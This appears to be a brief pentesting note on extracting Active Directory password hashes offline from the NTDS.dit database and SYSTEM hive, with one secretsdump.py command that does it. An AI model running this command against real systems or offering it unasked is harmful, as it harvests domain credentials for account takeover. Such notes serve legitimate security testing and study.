#creds 

dumping sam offline, we need `NTDS.dit` and `SYSTEM` files. 
`NTDS.dit` has all the hashes and encrypted using `SYSTEM` so we need both


```bash
secretsdump.py -ntds ntds.dit -system SYSTEM local
```